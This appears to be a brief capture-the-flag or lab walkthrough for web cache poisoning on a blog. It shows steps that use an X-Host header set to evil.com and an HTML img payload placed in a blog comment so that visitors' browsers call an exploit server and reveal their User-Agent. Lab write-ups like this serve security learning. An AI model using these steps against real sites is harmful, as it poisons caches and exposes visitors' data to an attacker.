
1. Verify that the `Vary` response header tell us, that the User-Agent header can be cached.


![](/static/img/Pasted_image_20231116143043.png)

2. Runs para miner extension to verify all the "Headers"

![](/static/img/Pasted_image_20231116143239.png)

3. Add the evil.com host with the X-host header and send the request

![](/static/img/Pasted_image_20231116143443.png)
4. Add the following payload to the exploit server 
![](/static/img/Pasted_image_20231116143851.png)
5. Add the following payload inside any comment at the blog, to grab the users "User-Agent". 

```
><img src="//exploit.server/foo"/>aa 
```

![](/static/img/Pasted_image_20231116145649.png)

6. Now, go back to the root of the website and send your payload remember to send the request many times.. 

![](/static/img/Pasted_image_20231116151230.png)


![](/static/img/Pasted_image_20231116151241.png)

